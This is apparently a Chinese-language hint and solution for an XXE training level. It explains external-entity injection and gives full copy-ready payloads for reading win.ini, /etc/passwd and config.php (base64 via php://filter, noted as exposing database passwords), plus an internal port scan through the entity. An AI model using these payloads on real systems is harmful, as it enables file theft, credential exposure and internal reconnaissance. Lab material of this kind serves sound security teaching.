思路提示

XXE 的核心是XML 解析器加载了外部实体。思路：在 XML 的 DOCTYPE 里定义一个外部实体，指向服务器本地文件（如 file:///C:/Windows/win.ini），然后在正文里引用这个实体，解析时文件内容就会被"夹带"到回显里。读 PHP 源码要注意 <?php 会破坏 XML 结构，需用 php://filter 先 base64 编码再读。

详细解题过程（点击展开）
目标1 - 读本地文件（完整 payload，全选复制即可）：
Windows 环境，把下面整段粘贴到 XML 报文文本框里提交： 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<user>
    <name>&xxe;</name>
    <email>a@a.com</email>
</user>
Linux 环境换成： 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
    <email>a@a.com</email>
</user>
目标2 - base64 读 config.php 源码（完整 payload，全选复制即可）：
直接 file:/// 读 PHP 源码会因 <?php 的 < 破坏 XML 结构导致解析失败，改用 php://filter 先 base64 编码再读： 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={{BASE_DIR}}/config.php">
]>
<user>
    <name>&xxe;</name>
    <email>a@a.com</email>
</user>
提交后回显的 base64 字符串拿去解码即得 config.php 完整源码（含数据库口令）。
目标3 - XXE 探测内网（完整 payload）： 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<user>
    <name>&xxe;</name>
    <email>a@a.com</email>
</user>
把端口改成 8080、3306、6379 等，对比解析成功/报错差异即可判断内网存活服务。
抓包点：本关是 POST 提交 XML，可用 Burp Repeater 反复改报文测试。
